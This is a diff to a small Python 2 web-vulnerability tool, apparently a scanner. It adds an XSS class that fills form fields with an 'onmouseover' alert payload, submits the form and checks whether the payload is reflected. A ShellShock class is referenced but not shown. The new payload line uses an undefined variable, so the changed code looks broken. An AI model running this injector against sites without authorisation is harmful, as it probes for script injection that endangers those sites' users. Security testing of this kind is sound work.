@@ -273,7 +273,7 @@ class HTTP(object):
         del self.request_header['Content-Length']
 
         print postStr
-        # return self.__tcp_request(page, syn_ack, postStr)
+        return self.__tcp_request(page, syn_ack, postStr)
 
 
     def __tcp_request(self, page, syn_ack, html_request):
@@ -341,6 +341,8 @@ class ShellShock(HTTP):
         self.GET(self.target)
 
 class XSS():
+    PAYLOAD = "<a onmouseover=\"alert('" + uid + "')\"</script>"
+
     def __init__(self, host, page, cookie = None):
         print host, page
         self.target = HTTP(host, header = {'Cookie': cookie} if cookie else {})
@@ -382,7 +384,7 @@ class XSS():
             else: data[name] = ""
 
             uid = getUniqueID()
-            data[self.fieldname] = "<a onmouseover=\"alert('" + uid + "')\"</script>"
+            data[self.fieldname] = XSS.PAYLOAD
         return data
 
     def run(self, fieldname, fieldvalue = {}):
@@ -406,8 +408,10 @@ class XSS():
         if form['action'] == '': form_dest = self.page
         else: form_dest = os.path.normpath(os.path.join(self.page, form['action']))
 
-        if form['method'].lower() == 'post' in  = self.target.POST(form_dest, data=formdata)
-        elif form['method'].lower() == 'get' in  = self.target.GET(form_dest + '?' + formdata)
+        if form['method'].lower() == 'post': self.target.POST(form_dest, data=formdata)
+        elif form['method'].lower() == 'get': self.target.GET(form_dest + '?' + formdata)
+
+        print XSS.PAYLOAD in self.target.get[form_dest]['data']
 
 def parseTarget(target):
     target = target.replace('http://', '')
